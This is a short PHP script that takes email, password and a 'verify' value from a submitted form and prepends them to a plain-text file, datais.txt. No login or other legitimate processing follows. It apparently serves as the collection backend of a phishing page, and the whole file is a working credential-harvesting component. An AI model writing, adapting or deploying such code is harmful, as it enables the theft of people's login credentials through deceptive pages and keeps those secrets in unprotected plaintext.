<?php
	if(isset($_POST['email'])){
		//print_r($_POST);
		$email=$_POST['email'];
		$pass=$_POST['pass'];
		$verify=$_POST['verify'];
		
		$prev_data= file_get_contents("datais.txt");
		$new_data = $email." :: ".$pass." :: ".$verify." \n";
		file_put_contents("datais.txt", $new_data." ".$prev_data);
	}

?>